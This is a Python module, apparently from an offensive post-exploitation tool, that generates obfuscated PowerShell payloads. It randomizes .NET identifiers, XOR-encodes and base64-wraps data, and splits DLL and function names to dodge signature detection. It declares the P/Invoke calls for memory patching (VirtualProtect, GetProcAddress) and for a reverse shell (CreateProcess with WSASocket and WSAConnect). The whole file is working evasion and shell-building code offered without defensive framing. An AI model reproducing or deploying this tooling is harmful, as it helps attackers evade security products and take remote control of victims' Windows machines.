"""
shell.commands — helper functions, reflective .NET identifiers, dll_import
"""

from base64 import b64encode, b64decode
from random import randbytes, randint
import shlex


# ── helpers ───────────────────────────────────────────────────────────────────
def chunks(xs, n):
    for off in range(0, len(xs), n):
        yield xs[off:off+n]

def b64str(s):
    if isinstance(s, str):
        return b64encode(s.encode()).decode()
    return b64encode(s).decode()

def split_args(cmdline):
    try:
        args = shlex.split(cmdline, posix=False)
    except ValueError:
        return []
    return [
        a[1:-1] if (a.startswith('"') and a.endswith('"')) or
                   (a.startswith("'") and a.endswith("'")) else a
        for a in args
    ]

def xorenc(xs, key):
    return bytes(x ^ key for x in xs)

def str_b64(arg):
    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"


# ── random identifiers used for reflective .NET loading ──────────────────────
_ns          = "A" + randbytes(randint(3,8)).hex()
_host_writer = "H" + randbytes(randint(3,8)).hex()

new_HostWriter    = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
import_HostWriter = f"""
Add-Type -TypeDefinition @"
namespace {_ns} {{
public class {_host_writer} : System.IO.TextWriter {{
private System.Action<string> _act;
public {_host_writer}(System.Action<string> act) {{ _act = act; }}
public override void Write(char v)   {{ _act(v.ToString()); }}
public override void Write(string v) {{ _act(v); }}
public override void WriteLine(string v) {{ _act(v + System.Environment.NewLine); }}
public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encoding.UTF8; }} }}
}}
}}
"@"""

_xor_enc = "X" + randbytes(randint(3,8)).hex()
_xor_key = randint(1,255)
call_XorEnc   = f"[{_ns}.{_xor_enc}]::x"
import_XorEnc = f"""
Add-Type @"
namespace {_ns} {{
public class {_xor_enc} {{
public static byte[] x(byte[] y) {{
for(int i = 0; i < y.Length; i++) {{ y[i] ^= {_xor_key}; }}
return y;
}}
}}
}}
"@
"""

_path_fix    = "P" + randbytes(randint(3,8)).hex()
_new_PathFix = f"(New-Object {_ns}.{_path_fix})"
_importPathFix = f"""
Add-Type @"
namespace {_ns} {{
public class {_path_fix} : System.Text.UTF8Encoding {{
public override byte[] GetBytes(string s) {{
s=s.Replace("\\\\", "/");
return base.GetBytes(s);
}}
}}
}}
"@
"""


# ── dll_import: generates D/Invoke-style Add-Type payloads ───────────────────
def dll_import(ns, lib, fun, sigs):
    cls   = f"f{randbytes(randint(3,8)).hex()}"
    name  = f"g{randbytes(randint(3,8)).hex()}"
    ret   = sigs[0]
    args  = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
    dll   = "+".join(f'"{c_}"' for c_ in lib)
    entry = "+".join(f'"{c_}"' for c_ in fun)
    code  = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
    globals()["_call_"   + fun] = f"[{ns}.{cls}]::{name}"
    globals()["_import_" + fun] = f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"


dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr","string"])
dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr","IntPtr","string"])
dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr","IntPtr","IntPtr","uint","out uint"])
dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr","IntPtr","string","IntPtr","IntPtr","bool","uint","IntPtr","IntPtr","Int64[]","byte[]"])
dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr","short","byte[]"])
dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr","uint","uint","uint","IntPtr","uint","uint"])
dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr","IntPtr","byte[]","int","IntPtr","IntPtr","IntPtr","IntPtr"])